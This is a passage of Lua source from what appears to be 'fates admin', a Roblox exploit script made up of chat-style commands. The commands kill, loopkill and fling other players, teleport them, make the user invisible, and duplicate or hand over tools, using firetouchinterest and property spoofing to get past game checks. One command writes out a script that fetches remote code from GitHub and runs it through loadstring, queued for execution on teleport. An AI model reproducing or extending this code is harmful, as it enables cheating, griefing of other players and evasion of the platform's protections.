		return Command
	end

	local Keys = {}

	do
		local UserInputService = Services.UserInputService
		local IsKeyDown = UserInputService.IsKeyDown
		local WindowFocused = true
		AddConnection(CConnect(UserInputService.WindowFocusReleased, function()
			WindowFocused = false
		end));
		AddConnection(CConnect(UserInputService.WindowFocused, function()
			WindowFocused = true
		end));
		local GetFocusedTextBox = UserInputService.GetFocusedTextBox
		AddConnection(CConnect(UserInputService.InputBegan, function(Input, GameProcessed)
			Keys["GameProcessed"] = GameProcessed and WindowFocused and not (not GetFocusedTextBox(UserInputService));
			Keys["LastEntered"] = Input.KeyCode
			if (GameProcessed) then return end
			local KeyCode = split(tostring(Input.KeyCode), ".")[3]
			Keys[KeyCode] = true
			for i = 1, #Macros do
				local Macro = Macros[i]
				if (Tfind(Macro.Keys, Input.KeyCode)) then
					if (#Macro.Keys == 2) then
						if (IsKeyDown(UserInputService, Macro.Keys[1]) and IsKeyDown(UserInputService, Macro.Keys[2]) --[[and Macro.Keys[1] == Input.KeyCode]]) then
							ExecuteCommand(Macro.Command, Macro.Args);
						end
					else
						ExecuteCommand(Macro.Command, Macro.Args);
					end
				end
			end

			if (Input.KeyCode == Enum.KeyCode.F8) then
				if (Console.Visible) then
					local Tween = Utils.TweenAllTrans(Console, .25)
					CWait(Tween.Completed);
					Console.Visible = false
				else
					local MessageClone = Clone(Console.Frame.List);

					Utils.ClearAllObjects(Console.Frame.List)
					Console.Visible = true

					local Tween = Utils.TweenAllTransToObject(Console, .25, ConsoleTransparencyClone)

					Destroy(Console.Frame.List)
					MessageClone.Parent = Console.Frame

					for i, v in next, GetChildren(Console.Frame.List) do
						if (not IsA(v, "UIListLayout")) then
							Utils.Tween(v, "Sine", "Out", .25, {
								TextTransparency = 0
							})
						end
					end

					local ConsoleListLayout = Console.Frame.List.UIListLayout

					CConnect(GetPropertyChangedSignal(ConsoleListLayout, "AbsoluteContentSize"), function()
						local CanvasPosition = Console.Frame.List.CanvasPosition
						local CanvasSize = Console.Frame.List.CanvasSize
						local AbsoluteSize = Console.Frame.List.AbsoluteSize

						if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
							wait();
							Console.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000);
						end
					end)

					Utils.Tween(Console.Frame.List, "Sine", "Out", .25, {
						ScrollBarImageTransparency = 0
					})
				end
			end
		end));
		AddConnection(CConnect(UserInputService.InputEnded, function(Input, GameProcessed)
			if (GameProcessed) then return end
			local KeyCode = split(tostring(Input.KeyCode), ".")[3]
			if (Keys[KeyCode] or Keys[Input.KeyCode]) then
				Keys[KeyCode] = false
			end
		end));
	end

	AddCommand("commandcount", {"cc"}, "shows you how many commands there is in fates admin", {}, function(Caller)
		Utils.Notify(Caller, "Amount of Commands", format("There are currently %s commands.", #filter(CommandsTable, function(i,v)
			return indexOf(CommandsTable, v) == i
		end)))
	end)

	AddCommand("walkspeed", {"ws", "speed"}, "changes your walkspeed to the second argument", {}, function(Caller, Args, CEnv)
		local Humanoid = GetHumanoid();
		CEnv[1] = Humanoid.WalkSpeed
		SpoofProperty(Humanoid, "WalkSpeed");
		Humanoid.WalkSpeed = tonumber(Args[1]) or 16
		return "your walkspeed is now " .. Humanoid.WalkSpeed
	end)

	AddCommand("jumppower", {"jp"}, "changes your jumpower to the second argument", {}, function(Caller, Args, CEnv)
		local Humanoid = GetHumanoid();
		CEnv[1] = Humanoid.JumpPower
		SpoofProperty(Humanoid, "JumpPower");
		SpoofProperty(Humanoid, "UseJumpPower");
		Humanoid.UseJumpPower = true
		Humanoid.JumpPower = tonumber(Args[1]) or 50
		return "your jumppower is now " .. Humanoid.JumpPower
	end)

	AddCommand("hipheight", {"hh"}, "changes your hipheight to the second argument", {}, function(Caller, Args, CEnv)
		local Humanoid = GetHumanoid();
		CEnv[1] = Humanoid.HipHeight
		SpoofProperty(Humanoid, "HipHeight");
		Humanoid.HipHeight = tonumber(Args[1]) or 0
		return "your hipheight is now " .. Humanoid.HipHeight
	end)

	_L.KillCam = {};
	AddCommand("kill", {"tkill"}, "kills someone", {"1", 1, 3}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local OldPos = GetRoot().CFrame
		local Humanoid = ReplaceHumanoid();
		local TempRespawnTimes = {}
		for i, v in next, Target do
			TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
		end
		local Character = GetCharacter();
		for i, v in next, Target do
			if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
				Destroy(Character);
				Character = CWait(LocalPlayer.CharacterAdded);
				WaitForChild(Character, "Humanoid");
				wait()
				Humanoid = ReplaceHumanoid();
			end
		end
		if (Character.Animate) then
			Character.Animate.Disabled = true
		end
		UnequipTools(Humanoid);

		local TChar;
		CThread(function()
			for i = 1, #Target do
				local v = Target[i]
				TChar = GetCharacter(v);
				if (TChar) then
					if (isSat(v)) then
						if (#Target == 1) then
							Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not kill");
						end
						continue
					end
					local TargetRoot = GetRoot(v);
					if (not TargetRoot) then
						continue
					end
					if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] and isR6(v)) then
						continue
					end

					local Tool = GetCorrectToolWithHandle();
					if (not Tool) then
						continue
					end
					Tool.Parent = Character
					Tool.Handle.Size = Vector3New(4, 4, 4);
					CFrameTool(Tool, TargetRoot.CFrame);
					firetouchinterest(TargetRoot, Tool.Handle, 0);
					firetouchinterest(TargetRoot, Tool.Handle, 1);
				else
					Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not kill.");
				end
			end
		end)()
		ChangeState(Humanoid, 15);
		if (_L.KillCam and #Target == 1 and TChar) then
			Camera.CameraSubject = TChar
		end
		wait(.3);
		Destroy(Character);
		Character = CWait(LocalPlayer.CharacterAdded);
		WaitForChild(Character, "HumanoidRootPart").CFrame = OldPos
	end)

	AddCommand("kill2", {}, "another variant of kill", {1, "1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local TempRespawnTimes = {}
		for i, v in next, Target do
			TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
		end
		local Humanoid = FindFirstChildWhichIsA(GetCharacter(), "Humanoid");
		ReplaceCharacter();
		wait(Players.RespawnTime - (#Target == 1 and .05 or .09)); -- this really kinda depends on ping
		local OldPos = GetRoot().CFrame
		Humanoid2 = ReplaceHumanoid(Humanoid);
		for i, v in next, Target do
			if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
				CWait(LocalPlayer.CharacterAdded);
				WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
				wait(.1);
				Humanoid2 = ReplaceHumanoid();
			end
		end

		UnequipTools(Humanoid);
		local Destroy_;
		CThread(function()
			for i = 1, #Target do
				local v = Target[i]
				if (GetCharacter(v)) then
					if (isSat(v)) then
						Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not kill");
						continue
					end
					if (TempRespawnTimes[v.Name] and isR6(v)) then
						if (#Target == 1) then
							Destroy_ = true
						else
							continue
						end
					end
					local TargetRoot = GetRoot(v);
					if (not TargetRoot) then
						continue
					end
					local Tool = GetCorrectToolWithHandle();
					if (not Tool) then
						continue
					end
					Tool.Parent = GetCharacter();
					Tool.Handle.Size = Vector3New(4, 4, 4);
					CFrameTool(Tool, TargetRoot.CFrame * CFrameNew(0, 3, 0));
					firetouchinterest(TargetRoot, Tool.Handle, 0);
					wait();
					if (not FindFirstChild(Tool, "Handle")) then
						continue
					end
					firetouchinterest(TargetRoot, Tool.Handle, 1);
				else
					Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not kill.");
				end
			end
		end)()
		ChangeState(Humanoid2, 15);
		if (Destroy_) then
			wait(.2);
			ReplaceCharacter();
		end
		CWait(LocalPlayer.CharacterAdded);
		WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
	end)

	AddCommand("loopkill", {}, "loopkill loopkills a character", {3,"1"}, function(Caller, Args, CEnv)
		local Target = GetPlayer(Args[1]);
		for i, v in next, Target do
			CEnv[#CEnv + 1] = v
		end
		repeat
			local Character, Humanoid = GetCharacter(), GetHumanoid();
			UnequipTools(Humanoid);
			DisableAnimate();
			Humanoid = ReplaceHumanoid(Humanoid);
			ChangeState(Humanoid, 15);
			if (isR6(Target[1])) then
				Utils.Notify(LocalPlayer, "Loopkill", "the player is in r6 it will only kill every 2 respawns")
			end
			for i = 1, #Target do
				local v = Target[i]
				local TargetRoot = GetRoot(v)
				local Children = GetChildren(LocalPlayer.Backpack);
				for i2 = 1, #Children do
					local v2 = Children[i2]
					if (IsA(v2, "Tool")) then
						SpoofInstance(v);
						v2.Parent = GetCharacter();
						local OldSize = v2.Handle.Size
						for i3 = 1, 3 do
							if (TargetRoot) then
								firetouchinterest(TargetRoot, v2.Handle, 0);
								wait();
								firetouchinterest(TargetRoot, v2.Handle, 1);
							end
						end
						v2.Handle.Size = OldSize
					end
				end
			end
			wait(.2);
			Destroy(LocalPlayer.Character);
			CWait(LocalPlayer.CharacterAdded);
			WaitForChild(LocalPlayer.Character, "HumanoidRootPart");
			wait(1);
		until not next(LoadCommand("loopkill").CmdEnv) or not GetPlayer(Args[1])
	end)

	AddCommand("unloopkill", {"unlkill"}, "unloopkills a user", {3,"1"}, function(Caller, Args)
		LoadCommand("loopkill").CmdEnv = {}
		return "loopkill disabled"
	end)

	AddCommand("bring", {}, "brings a user", {1}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Target2 = Args[2] and GetPlayer(Args[2]);
		local OldPos = GetRoot(Caller).CFrame
		if (Caller ~= LocalPlayer and Target[1] == LocalPlayer) then
			GetRoot().CFrame = GetRoot(Caller).CFrame * CFrameNew(-5, 0, 0);
		else
			local TempRespawnTimes = {}
			for i = 1, #Target do
				local v = Target[i]
				TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
			end
			DisableAnimate();
			ReplaceHumanoid();
			for i, v in next, Target do
				if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
					Destroy(LocalPlayer.Character);
					CWait(LocalPlayer.CharacterAdded);
					WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos;
					wait(.1);
					ReplaceHumanoid();
				end
			end
			local Target2Root = Target2 and GetRoot(Target2 and Target2[1] or nil);
			for i = 1, #Target do
				local v = Target[i]
				if (GetCharacter(v)) then
					if (isSat(v)) then
						if (#Target == 1) then
							Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not bring");
						end
						continue
					end
					if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] and isR6(v)) then
						continue
					end

					local TargetRoot = GetRoot(v);
					if (not TargetRoot) then
						continue
					end

					local Tool = GetCorrectToolWithHandle();
					if (not Tool) then
						continue
					end
					Tool.Parent = GetCharacter();
					Tool.Handle.Size = Vector3New(4, 4, 4);
					CFrameTool(Tool, (Target2 and Target2Root.CFrame or OldPos) * CFrameNew(-5, 0, 0));
					if (not syn) then
						wait(.1);
					end
					for i2 = 1, 3 do
						firetouchinterest(TargetRoot, Tool.Handle, 0);
						wait();
						firetouchinterest(TargetRoot, Tool.Handle, 1);
					end
				else
					Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not bring.");
				end
			end
			wait(.2);
			Destroy(LocalPlayer.Character);
			CWait(LocalPlayer.CharacterAdded);
			WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
		end
	end)

	AddCommand("bring2", {}, "another variant of bring", {1, 3, "1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Target2 = Args[2] and GetPlayer(Args[2]);
		local TempRespawnTimes = {}
		for i, v in next, Target do
			TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
		end
		local Humanoid = FindFirstChildWhichIsA(GetCharacter(), "Humanoid");
		local Character = ReplaceCharacter();
		wait(Players.RespawnTime - (#Target == 1 and .2 or .3));
		local OldPos = GetRoot().CFrame
		DisableAnimate();
		local Humanoid2 = ReplaceHumanoid(Humanoid);
		for i, v in next, Target do
			if (#Target == 1 and TempRespawnTimes[v.Name]) then
				Character = CWait(LocalPlayer.CharacterAdded);
				WaitForChild(Character, "HumanoidRootPart").CFrame = OldPos
				wait(.1);
				Humanoid2 = ReplaceHumanoid();
			end
		end
		local Target2Root = Target2 and GetRoot(Target2 and Target2[1] or nil);
		local Destroy_;
		CThread(function()
			for i, v in next, Target do
				if (GetCharacter(v)) then
					if (isSat(v)) then
						Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not bring");
						continue
					end

					if (TempRespawnTimes[v.Name]) then
						if (#Target == 1) then
							Destroy_ = true
						else
							continue
						end
					end
					local TargetRoot = GetRoot(v);
					local Tool = GetCorrectToolWithHandle();
					if (not Tool) then
						continue
					end
					Tool.Parent = Character
					Tool.Handle.Size = Vector3New(4, 4, 4);
					CFrameTool(Tool, (Target2 and Target2Root.CFrame or OldPos) * CFrameNew(-5, 0, 0));
					if (not syn) then
						wait(.1);
					end
					for i2 = 1, 3 do
						firetouchinterest(TargetRoot, Tool.Handle, 0);
						wait()
						firetouchinterest(TargetRoot, Tool.Handle, 1);
					end
				else
					Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not bring.");
				end
			end
		end)()
		if (Destroy_) then
			wait(.2);
			GetRoot().CFrame = CFrameNew(0, Services.Workspace.FallenPartsDestroyHeight + 50, 0);
			Destroy(Character);
		end
		Character = CWait(LocalPlayer.CharacterAdded);
		WaitForChild(Character, "HumanoidRootPart").CFrame = OldPos
	end)

	AddCommand("void", {"kill3"}, "voids a user", {1,"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Target2 = Args[2] and GetPlayer(Args[2]);
		local OldPos = GetRoot(Caller).CFrame

		local TempRespawnTimes = {}
		for i = 1, #Target do
			local v = Target[i]
			TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
		end
		DisableAnimate();
		ReplaceHumanoid();
		for i, v in next, Target do
			if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
				Destroy(LocalPlayer.Character);
				CWait(LocalPlayer.CharacterAdded);
				WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos;
				wait(.1);
				ReplaceHumanoid();
			end
		end
		local Target2Root = Target2 and GetRoot(Target2 and Target2[1] or nil);
		for i = 1, #Target do
			local v = Target[i]
			if (GetCharacter(v)) then
				if (isSat(v)) then
					if (#Target == 1) then
						Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not bring");
					end
					continue
				end
				if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] and isR6(v)) then
					continue
				end

				local TargetRoot = GetRoot(v);
				if (not TargetRoot) then
					continue
				end

				local Tool = GetCorrectToolWithHandle();
				if (not Tool) then
					continue
				end
				Tool.Parent = GetCharacter();
				Tool.Handle.Size = Vector3New(4, 4, 4);
				CFrameTool(Tool, (Target2 and Target2Root.CFrame or OldPos) * CFrameNew(-5, 0, 0));
				if (not syn) then
					wait(.1);
				end
				for i2 = 1, 3 do
					firetouchinterest(TargetRoot, Tool.Handle, 0);
					wait();
					firetouchinterest(TargetRoot, Tool.Handle, 1);
				end
			else
				Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not bring.");
			end
		end
		for i = 1, 3 do
			GetRoot().CFrame = CFrameNew(0, Services.Workspace.FallenPartsDestroyHeight + 50, 0);
			wait();
		end
		wait(.2);
		Destroy(LocalPlayer.Character);
		CWait(LocalPlayer.CharacterAdded);
		WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
	end)

	AddCommand("freefall", {}, "freefalls a user", {1,"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Target2 = Args[2] and GetPlayer(Args[2]);
		local OldPos = GetRoot(Caller).CFrame

		local TempRespawnTimes = {}
		for i = 1, #Target do
			local v = Target[i]
			TempRespawnTimes[v.Name] = RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name]
		end
		DisableAnimate();
		ReplaceHumanoid();
		for i, v in next, Target do
			if (#Target == 1 and TempRespawnTimes[v.Name] and isR6(v)) then
				Destroy(LocalPlayer.Character);
				CWait(LocalPlayer.CharacterAdded);
				WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos;
				wait(.1);
				ReplaceHumanoid();
			end
		end
		local Target2Root = Target2 and GetRoot(Target2 and Target2[1] or nil);
		for i = 1, #Target do
			local v = Target[i]
			if (GetCharacter(v)) then
				if (isSat(v)) then
					if (#Target == 1) then
						Utils.Notify(Caller or LocalPlayer, nil, v.Name .. " is sitting down, could not bring");
					end
					continue
				end
				if (RespawnTimes[LocalPlayer.Name] <= RespawnTimes[v.Name] and isR6(v)) then
					continue
				end

				local TargetRoot = GetRoot(v);
				if (not TargetRoot) then
					continue
				end

				local Tool = GetCorrectToolWithHandle();
				if (not Tool) then
					continue
				end
				Tool.Parent = GetCharacter();
				Tool.Handle.Size = Vector3New(4, 4, 4);
				CFrameTool(Tool, (Target2 and Target2Root.CFrame or OldPos) * CFrameNew(-5, 0, 0));
				if (not syn) then
					wait(.1);
				end
				for i2 = 1, 3 do
					firetouchinterest(TargetRoot, Tool.Handle, 0);
					wait();
					firetouchinterest(TargetRoot, Tool.Handle, 1);
				end
			else
				Utils.Notify(Caller or LocalPlayer, "Fail", v.Name .. " is dead or does not have a root part, could not bring.");
			end
		end
		local Root = GetRoot();
		local RootPos = Root.Position
		for i = 1, 3 do
			Root.Position = Vector3New(RootPos.X, RootPos.Y + 1000, RootPos.Z);
			wait();
		end
		wait(.2);
		Destroy(LocalPlayer.Character);
		CWait(LocalPlayer.CharacterAdded);
		WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
	end)

	AddCommand("view", {"v"}, "views a user", {3,"1"}, function(Caller, Args, CEnv)
		local Target = GetPlayer(Args[1]);
		if (#Target ~= 1) then
			return "you can only view 1 person"
		end
		Target = Target[1]
		Camera.CameraSubject = GetCharacter(Target) or GetCharacter();
		AddConnection(CConnect(Target.CharacterAdded, function()
			CWait(Heartbeat);
			Camera.CameraSubject = Target.Character
		end), CEnv);
		AddConnection(CConnect(LocalPlayer.CharacterAdded, function()
			WaitForChild(LocalPlayer.Character, "Humanoid");
			CWait(Camera.CameraSubject.Changed);
			CWait(Heartbeat);
			Camera.CameraSubject = Target.Character
		end), CEnv);
		return "viewing " .. Target.Name
	end)

	AddCommand("unview", {"unv"}, "unviews a user", {3}, function(Caller, Args)
		DisableAllCmdConnections("view");
		Camera.CameraSubject = GetCharacter();
		return "unviewing"
	end)

	AddCommand("invisible", {"invis"}, "makes yourself invisible", {3}, function(Caller, Args, CEnv)
		local Root = GetRoot();
		local OldPos = Root.CFrame
		local Seat = InstanceNew("Seat");
		local Weld = InstanceNew("Weld");
		Root.CFrame = CFrameNew(9e9, 9e9, 9e9);
		wait(.2);
		Root.Anchored = true
		ProtectInstance(Seat);
		Seat.Parent = Services.Workspace
		Seat.CFrame = Root.CFrame
		Seat.Anchored = false
		Weld.Parent = Seat
		Weld.Part0 = Seat
		Weld.Part1 = Root
		Root.Anchored = false
		Seat.CFrame = OldPos
		CEnv.Seat = Seat
		CEnv.Weld = Weld
		for i, v in next, GetChildren(Root.Parent) do
			if (IsA(v, "BasePart") or IsA(v, "MeshPart") or IsA(v, "Part")) then
				CEnv[v] = v.Transparency
				v.Transparency = v.Transparency <= 0.3 and 0.4 or v.Transparency
			elseif (IsA(v, "Accessory")) then
				local Handle = FindFirstChildWhichIsA(v, "MeshPart") or FindFirstChildWhichIsA(v, "Part");
				if (Handle) then
					CEnv[Handle] = Handle.Transparency
					Handle.Transparency = Handle.Transparency <= 0.3 and 0.4 or Handle.Transparency    
				end
			end
		end
		return "you are now invisible"
	end)

	AddCommand("uninvisible", {"uninvis", "noinvis", "visible", "vis"}, "gives you back visiblity", {3}, function(Caller, Args, CEnv)
		local CmdEnv = LoadCommand("invisible").CmdEnv
		local Seat = CmdEnv.Seat
		local Weld = CmdEnv.Weld
		if (Seat and Weld) then
			Weld.Part0 = nil
			Weld.Part1 = nil
			Destroy(Seat);
			Destroy(Weld);
			CmdEnv.Seat = nil
			CmdEnv.Weld = nil
			for i, v in next, CmdEnv do
				if (type(v) == 'number') then
					i.Transparency = v
				end
			end
			return "you are now visible"
		end
		return "you are already visible"
	end)

	AddCommand("dupetools", {"dp"}, "dupes your tools", {"1", 1, {"protect"}}, function(Caller, Args, CEnv)
		local Amount = tonumber(Args[1])
		local Protected = Args[2] == "protect"
		if (not Amount) then
			return "amount must be a number"
		end

		CEnv[1] = true
		local AmountDuped = 0
		local Timer = (Players.RespawnTime * Amount) + (Amount * .4) + 1
		local Notification = Utils.Notify(Caller, "Duping Tools", format("%d/%d tools duped. %d seconds left", AmountDuped, Amount, Timer), Timer);
		CThread(function()
			for i = 1, Timer do
				if (not LoadCommand("dupetools").CmdEnv[1]) then
					do break end;
				end
				wait(1);
				Timer = Timer - 1
				Notification.Message.Text = format("%d/%d tools duped. %d seconds left", AmountDuped, Amount, Timer)
			end
		end)()


		local ToolAmount = #filter(GetChildren(LocalPlayer.Backpack), function(i, v)
			return IsA(v, "Tool");
		end)
		local Duped = {}
		local Humanoid = GetHumanoid();
		UnequipTools(Humanoid);
		local Connection = AddConnection(CConnect(GetCharacter().ChildAdded, function(Added)
			wait(.4);
			if (IsA(Added, "Tool")) then
				Added.Parent = LocalPlayer.Backpack
			end
		end), CEnv);
		for i = 1, Amount do
			if (not LoadCommand("dupetools").CmdEnv[1]) then
				do break end;
			end
			ReplaceCharacter();
			local OldPos
			if (Protected) then
				local OldFallen = Services.Workspace.FallenPartsDestroyHeight
				delay(Players.RespawnTime - .3, function()
					Services.Workspace.FallenPartsDestroyHeight = -math.huge
					OldPos = GetRoot().CFrame
					GetRoot().CFrame = CFrameNew(0, 1e9, 0);
					GetRoot().Anchored = true
				end)
			end
			UnequipTools(Humanoid);
			wait(Players.RespawnTime - .05);
			OldPos = OldPos or GetRoot().CFrame
			Humanoid = ReplaceHumanoid(Humanoid);
			local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, v)
				return IsA(v, "Tool");
			end)

			for i2, v in next, Tools do
				v.Parent = LocalPlayer.Character
				v.Parent = Services.Workspace
				Duped[#Duped + 1] = v
			end
			local Char = CWait(LocalPlayer.CharacterAdded);
			WaitForChild(Char, "HumanoidRootPart").CFrame = OldPos;

			for i2, v in next, Duped do
				if (v.Handle) then
					firetouchinterest(v.Handle, GetRoot(), 0);
					firetouchinterest(v.Handle, GetRoot(), 1);
				end
			end
			repeat CWait(RenderStepped);
				FindFirstChild(Char, "HumanoidRootPart").CFrame = OldPos
			until GetRoot().CFrame == OldPos

			repeat CWait(RenderStepped);
				Humanoid = FindFirstChild(Char, "Humanoid")
			until Humanoid
			wait(.4);
			UnequipTools(Humanoid);
			AmountDuped = AmountDuped + 1
		end
		Disconnect(Connection);
		return format("successfully duped %d tool (s)", #GetChildren(LocalPlayer.Backpack) - ToolAmount);
	end)

	AddCommand("dupetools2", {"rejoindupe", "dupe2"}, "sometimes a faster dupetools", {1,"1"}, function(Caller, Args)
		local Amount = tonumber(Args[1])
		if (not Amount) then
			return "amount must be a number"
		end
		local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
		if (not queue_on_teleport) then
			return "exploit not supported"
		end
		local Root, Humanoid = GetRoot(), GetHumanoid();
		local OldPos = Root.CFrame
		Root.CFrame = CFrameNew(0, 2e5, 0);
		UnequipTools(Humanoid);

		local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, v)
			return IsA(v, "Tool");
		end)

		local Char, Workspace, ReplicatedStorage = GetCharacter(), Services.Workspace, Services.ReplicatedStorage
		for i, v in next, Tools do
			v.Parent = Char
			v.Parent = Workspace
		end
		writefile("fates-admin/tooldupe.txt", tostring(Amount - 1));
		writefile("fates-admin/tooldupe.lua", format([[
        local OldPos = CFrame.new(%s);
        local DupeAmount = tonumber(readfile("fates-admin/tooldupe.txt"));
        local game = game
        local GetService = game.GetService
        local Players = GetService(game, "Players");
        local Workspace = GetService(game, "Workspace");
        local ReplicatedFirst = GetService(game, "ReplicatedFirst");
        local TeleportService = GetService(game, "TeleportService");
        ReplicatedFirst.SetDefaultLoadingGuiRemoved(ReplicatedFirst);
        local WaitForChild, GetChildren, IsA = game.WaitForChild, game.GetChildren, game.IsA
        local LocalPlayer = Players.LocalPlayer
        if (not LocalPlayer) then
            repeat wait(); LocalPlayer = Players.LocalPlayer until LocalPlayer
        end
        local Char = LocalPlayer.CharacterAdded.Wait(LocalPlayer.CharacterAdded);
        local RootPart = WaitForChild(Char, "HumanoidRootPart");
        if (DupeAmount <= 1) then
            for i, v in next, GetChildren(Workspace) do
                if (IsA(v, "Tool")) then
                    local Handle = WaitForChild(v, "Handle", .5);
                    if (Handle) then
                        firetouchinterest(Handle, RootPart, 0);
                        firetouchinterest(Handle, RootPart, 1);
                    end
                end
            end
            delfile("fates-admin/tooldupe.txt");
            delfile("fates-admin/tooldupe.lua");
            loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
            RootPart.CFrame = OldPos
            repeat wait() RootPart.CFrame = OldPos until RootPart.CFrame == OldPos
            getgenv().F_A.PluginLibrary.ExecuteCommand("dp", {"1"}, LocalPlayer);
        else
            RootPart.CFrame = CFrame.new(0, 2e5, 0);
            wait(.3);
            for i, v in next, GetChildren(LocalPlayer.Backpack) do
                v.Parent = Char
                v.Parent = Workspace
            end
            writefile("fates-admin/tooldupe.txt", tostring(DupeAmount - 1));
            local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
            queue_on_teleport(readfile("fates-admin/tooldupe.lua"));
            TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, game.JobId);
        end
    ]], tostring(OldPos)));
		local TeleportService = Services.TeleportService
		queue_on_teleport(readfile("fates-admin/tooldupe.lua"));
		TeleportService.TeleportToPlaceInstance(TeleportService, game.PlaceId, game.JobId);
	end)

	AddCommand("stopdupe", {}, "stops the dupe", {}, function()
		local Dupe = LoadCommand("dupetools").CmdEnv
		if (not next(Dupe)) then
			return "you are not duping tools"
		end
		LoadCommand("dupetools").CmdEnv[1] = false
		DisableAllCmdConnections("dupetools");
		return "dupetools stopped"
	end)

	AddCommand("savetools", {"st"}, "saves your tools", {1,3}, function(Caller, Args)
		UnequipTools(GetHumanoid());
		local Tools = GetChildren(LocalPlayer.Backpack);
		local Char = GetCharacter();
		for i, v in next, Tools do
			SpoofProperty(v, "Parent");
			v.Parent = Char
			v.Parent = Services.Workspace
			firetouchinterest(WaitForChild(Services.Workspace, v.Name).Handle, GetRoot(), 0);
			wait();
			firetouchinterest(v.Handle, GetRoot(), 1);
			WaitForChild(Char, v.Name).Parent = LocalPlayer.Backpack
		end
		Utils.Notify(Caller, nil, "Tools are now saved");
		CWait(GetHumanoid().Died);
		UnequipTools(GetHumanoid());
		Tools = GetChildren(LocalPlayer.Backpack);
		wait(Players.RespawnTime - wait()); -- * #Tools);
		for i, v in next, Tools do
			if (IsA(v, "Tool") and FindFirstChild(v, "Handle")) then
				v.Parent = Char
				v.Parent = Services.Workspace
			end
		end
		CWait(LocalPlayer.CharacterAdded);
		WaitForChild(LocalPlayer.Character, "HumanoidRootPart");
		for i, v in next, Tools do
			firetouchinterest(v.Handle, GetRoot(), 0);
			wait();
			firetouchinterest(v.Handle, GetRoot(), 1);
		end
		return "tools recovered??"
	end)

	AddCommand("givetools", {}, "gives all of your tools to a player", {3,1,"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Root = GetRoot();
		local OldPos = Root.CFrame
		local Humanoid = FindFirstChildOfClass(LocalPlayer.Character, "Humanoid");
		Humanoid.Name = "1"
		local Humanoid2 = Clone(Humanoid);
		Humanoid2.Parent = LocalPlayer.Character
		Humanoid2.Name = "Humanoid"
		Services.Workspace.Camera.CameraSubject = Humanoid2
		wait()
		Destroy(Humanoid);
		local Char = GetCharacter();
		for i, v in next, Target do
			local TRoot = GetRoot(v);
			for i2, v2 in next, GetChildren(LocalPlayer.Backpack) do
				if (IsA(v2, "Tool")) then
					v2.Parent = GetCharacter();
					CFrameTool(v2, TRoot.CFrame);
					local Handle = v2.Handle
					for i3 = 1, 3 do
						if (TRoot and Handle) then
							firetouchinterest(TRoot, Handle, 1);
							firetouchinterest(TRoot, Handle, 1);
						end
					end
				end
			end
		end
		wait(.2);
		Destroy(Char);
		Char = CWait(LocalPlayer.CharacterAdded);
		WaitForChild(Char, "HumanoidRootPart").CFrame = OldPos
	end)

	AddCommand("givetool", {}, "gives your tool(s) to a player", {3,1,"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local ToolAmount = tonumber(Args[2]) or 1
		local Root = GetRoot();
		local OldPos = Root.CFrame
		local Humanoid = FindFirstChildOfClass(LocalPlayer.Character, "Humanoid");
		Humanoid.Name = "1"
		local Humanoid2 = Clone(Humanoid);
		Humanoid2.Parent = LocalPlayer.Character
		Humanoid2.Name = "Humanoid"
		Services.Workspace.Camera.CameraSubject = Humanoid2
		wait()
		Destroy(Humanoid);
		UnequipTools(Humanoid2);
		local Char = GetCharacter();
		for i, v in next, Target do
			local TRoot = GetRoot(v);
			local Tools = GetChildren(LocalPlayer.Backpack);
